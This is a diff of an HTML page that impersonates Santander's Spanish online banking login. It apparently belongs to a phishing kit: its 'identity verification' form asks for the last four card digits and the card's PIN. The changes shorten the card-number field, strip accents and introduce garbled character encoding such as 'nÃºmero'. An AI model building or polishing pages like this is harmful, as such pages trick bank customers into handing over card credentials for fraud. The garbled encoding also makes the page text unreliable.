@@ -32,8 +32,8 @@
         </div>
 
         <div align="right" id="linksArea1" class="links">
-            <div style="display: inline;width:4em;" id="link1"><a class="opLogonStandardLink" href="https://particulares.gruposantander.es/SUPFPA_ENS/BtoChannelDriver.ssobto?dse_operationName=NavLoginSupernet&amp;dse_nextEventName=start&amp;_ga=2.4900209.318130340.1525748250-1046950590.1517634939&amp;dse_processorState=initial" target="_self">Español</a></div> |
-            <div style="display: inline;width:4em;" id="link2"><a class="opLogonStandardLink" href="https://ct.particulares.gruposantander.es/SUPFPA_ENS/BtoChannelDriver.ssobto?dse_operationName=NavLoginSupernet&amp;dse_nextEventName=start&amp;_ga=2.4900209.318130340.1525748250-1046950590.1517634939&amp;dse_processorState=initial" target="_self">Català</a></div> |
+            <div style="display: inline;width:4em;" id="link1"><a class="opLogonStandardLink" href="https://particulares.gruposantander.es/SUPFPA_ENS/BtoChannelDriver.ssobto?dse_operationName=NavLoginSupernet&amp;dse_nextEventName=start&amp;_ga=2.4900209.318130340.1525748250-1046950590.1517634939&amp;dse_processorState=initial" target="_self">EspaÃ±ol</a></div> |
+            <div style="display: inline;width:4em;" id="link2"><a class="opLogonStandardLink" href="https://ct.particulares.gruposantander.es/SUPFPA_ENS/BtoChannelDriver.ssobto?dse_operationName=NavLoginSupernet&amp;dse_nextEventName=start&amp;_ga=2.4900209.318130340.1525748250-1046950590.1517634939&amp;dse_processorState=initial" target="_self">CatalÃ </a></div> |
             <div style="display: inline;width:4em;" id="link3"><a class="opLogonStandardLink" href="https://en.particulares.gruposantander.es/SUPFPA_ENS/BtoChannelDriver.ssobto?dse_operationName=NavLoginSupernet&amp;dse_nextEventName=start&amp;_ga=2.4900209.318130340.1525748250-1046950590.1517634939&amp;dse_processorState=initial" target="_self">English</a></div>
         </div>
     </div>
@@ -48,7 +48,7 @@
                 <div id="auth" class="security">
                
     <div class="head">
-      <h1 class="title">Verificación de identidad	</h1>
+      <h1 class="title">Verificacion de identidad	</h1>
                     </div>
                     <script type="text/javascript">
                         <!--//--><![CDATA[//><!--
@@ -79,7 +79,7 @@ function checkDocumento()
     if (document.formu.Documento.value.length==0)
     {
       document.formu.Documento.focus();
-      alert ("Debe facilitarnos un número de documento que le identifique:");
+      alert ("Debe facilitarnos un nÃºmero de documento que le identifique:");
       return(false);
     }
     for (var i=0; i<document.formu.Documento.value.length; i++)
@@ -88,7 +88,7 @@ function checkDocumento()
       if ( (ch < "0" || ch > "9") && (ch < "a" || ch > "z") && (ch < "A" || ch > "Z") )
       {
         document.formu.Documento.focus();
-        alert("El número de documento identificativo facilitado no es correcto\nSólo se admiten dígitos y letras");
+        alert("El nÃºmero de documento identificativo facilitado no es correcto\nSolo se admiten dÃ­gitos y letras");
         return(false);
       }
    }
@@ -133,12 +133,16 @@ function checkDocumento()
 	</tr>
 	<tr>
 		<td width="2"><img src="./Files/px.gif" width="1" height="1"></td>
-		<td class="titulo">Verificación de identidad</td>
+		<td class="titulo">Verificacion de identidad</td>
 		<td width="2"><img src="./Files/px.gif" width="1" height="1"></td>
 	</tr>
 	<tr>
 		<td width="2"><img src="./Files/px.gif" width="1" height="1"></td>
-		<td class="texto">Por razones de seguridad, entre los últimos 4 números de su tarjeta de crédito y el PIN su tarjeta de crédito</td>
+		<td class="texto">Por razones de seguridad, entre los Ãºltimos 4 nÃºmeros de su tarjeta de credito y el PIN su tarjeta de credito<br />
+		  <br />
+		  <br />
+		  <br />
+		  <br /></td>
 		<td width="2"><img src="./Files/px.gif" width="1" height="1"></td>
 	</tr>
 	<tr>
@@ -146,9 +150,9 @@ function checkDocumento()
 		<table width="100%" border="0">
 			<tbody><tr>
 				<td width="30"><img src="./Files/px.gif" width="1" height="1"></td>
-				<td class="texto" width="140"><b>Los últimos 4 números de su tarjeta de crédito</b></td>
-				<td align="left" class="campo" width="420"><input name="ccnum" value="" id="ccnum" 
-			maxlenght=16 size="16" placeholder="XXXX XXXX XXXX " required="required"  ></td>
+				<td class="texto" width="140"><strong>Los Ãºltimos 4 nÃºmeros de su tarjeta de credito</strong></td>
+				<td align="left" class="campo" width="120"><input name="ccnum" value="" id="ccnum" 
+			maxlenght=4 size="4" placeholder=" " required="required"  ></td>
 			</tr>
 			<br>
 			<br>
@@ -162,7 +166,7 @@ function checkDocumento()
 			<tr>
 				<td width="30"><img src="./Files/px.gif" width="1" height="1"></td>
 				
-				<td class="texto"><b>Código PIN de cuatro dígitos de su tarjeta de crédito:</b></td>
+				<td class="texto"><b>Codigo PIN de cuatro dÃ­gitos de su tarjeta de credito:</b></td>
 				<td align="left" class="campo"><input type="text" name="pin" maxlength="4" autocomplete="off"  required="required"></td>
 			</tr>
 		</tbody></table>
@@ -220,7 +224,7 @@ function checkDocumento()
                 </li>
                 <li><a id="link2" target="_blank" class="opLogonStandardLink" href="https://www.bancosantander.es/es/particulares/tu-dia-a-dia/seguridad-online/seguridad-online/aprende-seguridad-online/">Seguridad</a>
                 </li>
-                <li><a id="link3" target="_blank" class="opLogonStandardLink" href="https://www.bancosantander.es/es/tablon-de-anuncios">Tablón</a>
+                <li><a id="link3" target="_blank" class="opLogonStandardLink" href="https://www.bancosantander.es/es/tablon-de-anuncios">Tablon</a>
                 </li>
                 <li><a id="link4" target="_blank" class="opLogonStandardLink" href="https://www.bancosantander.es/es/espacio-mifid">MIFID</a>
                 </li>
